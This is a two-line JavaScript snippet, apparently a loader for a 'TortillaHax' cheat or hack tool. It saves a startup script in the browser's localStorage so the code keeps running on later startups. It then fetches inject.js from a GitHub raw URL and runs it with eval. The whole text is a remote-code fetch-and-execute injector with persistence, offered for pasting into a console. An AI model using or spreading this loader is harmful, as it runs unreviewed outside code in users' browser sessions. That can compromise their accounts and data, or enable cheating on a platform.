localStorage.setItem("startupScript", "fetch(\"https://raw.githubusercontent.com/colbychittenden/TortillaHax/main/inject.js\").then(r => r.text()).then(r => eval(r))")
fetch("https://raw.githubusercontent.com/colbychittenden/TortillaHax/main/inject.js").then(r => r.text()).then(r => eval(r))
